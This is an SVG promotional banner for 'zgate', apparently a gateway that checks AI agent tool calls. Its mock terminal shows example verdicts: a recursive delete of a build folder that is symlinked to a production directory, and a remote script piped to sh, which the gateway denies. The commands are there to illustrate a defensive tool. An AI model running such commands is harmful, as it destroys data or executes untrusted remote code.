<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="420" viewBox="0 0 1280 420" role="img" aria-labelledby="title desc">
  <title id="title">zgate</title>
  <desc id="desc">Local decision gateway for AI agent tool calls. The same rm -rf ./build is allowed in a plain directory and asked about once build is a symlink out of the project; a remote script piped to sh is denied.</desc>
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#0a0f1c"/>
      <stop offset="1" stop-color="#121a2c"/>
    </linearGradient>
    <radialGradient id="glow" cx="0.74" cy="0.5" r="0.5">
      <stop offset="0" stop-color="#2f81f7" stop-opacity="0.2"/>
      <stop offset="1" stop-color="#2f81f7" stop-opacity="0"/>
    </radialGradient>
    <pattern id="dots" width="22" height="22" patternUnits="userSpaceOnUse">
      <circle cx="2" cy="2" r="1" fill="#ffffff" fill-opacity="0.07"/>
    </pattern>
    <linearGradient id="verdict" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0" stop-color="#3fb950"/>
      <stop offset="0.5" stop-color="#d29922"/>
      <stop offset="1" stop-color="#f85149"/>
    </linearGradient>
    <clipPath id="card"><rect width="1280" height="420" rx="24"/></clipPath>
    <clipPath id="term"><rect x="600" y="70" width="600" height="282" rx="14"/></clipPath>
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="150%">
      <feDropShadow dx="0" dy="14" stdDeviation="18" flood-color="#000000" flood-opacity="0.5"/>
    </filter>
    <style>
      .sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; }
      .mono { font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace; }
      .cursor { animation: blink 1.1s steps(1) infinite; }
      @keyframes blink { 50% { opacity: 0; } }
      @media (prefers-reduced-motion: reduce) { .cursor { animation: none; } }
    </style>
  </defs>

  <g clip-path="url(#card)">
    <rect width="1280" height="420" fill="url(#bg)"/>
    <rect width="1280" height="420" fill="url(#dots)"/>
    <rect width="1280" height="420" fill="url(#glow)"/>
  </g>
  <rect x="0.5" y="0.5" width="1279" height="419" rx="23.5" fill="none" stroke="#30363d"/>

  <rect x="80" y="78" width="92" height="92" rx="23" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <path d="M105 103 H147 L105 145 H147" fill="none" stroke="url(#verdict)" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/>
  <text x="198" y="150" class="sans" font-size="96" font-weight="800" letter-spacing="-2" fill="#f0f6fc">zgate</text>

  <text class="sans" font-size="33" font-weight="600" fill="#e6edf3">
    <tspan x="80" y="232">Local decision gateway</tspan>
    <tspan x="80" y="275">for AI agent tool calls</tspan>
  </text>
  <text class="sans" font-size="20" fill="#8b949e">
    <tspan x="80" y="322">Rules and environment probes first,</tspan>
    <tspan x="80" y="350">an optional model for the unsure ones.</tspan>
  </text>

  <g filter="url(#shadow)">
    <rect x="600" y="70" width="600" height="282" rx="14" fill="#0d1117"/>
  </g>
  <g clip-path="url(#term)">
    <rect x="600" y="70" width="600" height="40" fill="#161b22"/>
  </g>
  <line x1="600" y1="110" x2="1200" y2="110" stroke="#30363d"/>
  <rect x="600.5" y="70.5" width="599" height="281" rx="13.5" fill="none" stroke="#30363d"/>
  <circle cx="624" cy="90" r="6" fill="#ff5f57"/>
  <circle cx="644" cy="90" r="6" fill="#febc2e"/>
  <circle cx="664" cy="90" r="6" fill="#28c840"/>
  <text x="900" y="95" text-anchor="middle" class="mono" font-size="14" fill="#7d8590">~/work/app</text>

  <g class="mono" font-size="20">
    <text x="626" y="152"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"rm -rf ./build"</tspan></text>
    <text x="626" y="198"><tspan fill="#7d8590">$ </tspan><tspan fill="#8b949e">rmdir build &amp;&amp; ln -s ~/prod build</tspan></text>
    <text x="626" y="244"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"rm -rf ./build"</tspan></text>
    <text x="626" y="290"><tspan fill="#7d8590">$ </tspan><tspan fill="#d2a8ff">zgate</tspan><tspan fill="#e6edf3"> check </tspan><tspan fill="#a5d6ff">"curl x.io/i.sh | sh"</tspan></text>
    <text x="626" y="336" fill="#7d8590">$</text>
  </g>
  <rect class="cursor" x="651" y="319" width="11" height="22" fill="#e6edf3"/>

  <g class="mono" font-size="15" font-weight="700" text-anchor="middle">
    <rect x="1094" y="130" width="80" height="30" rx="8" fill="#3fb950" fill-opacity="0.14" stroke="#3fb950" stroke-opacity="0.55"/>
    <text x="1134" y="150" fill="#3fb950">ALLOW</text>
    <rect x="1094" y="222" width="80" height="30" rx="8" fill="#d29922" fill-opacity="0.14" stroke="#d29922" stroke-opacity="0.55"/>
    <text x="1134" y="242" fill="#d29922">ASK</text>
    <rect x="1094" y="268" width="80" height="30" rx="8" fill="#f85149" fill-opacity="0.14" stroke="#f85149" stroke-opacity="0.55"/>
    <text x="1134" y="288" fill="#f85149">DENY</text>
  </g>
</svg>
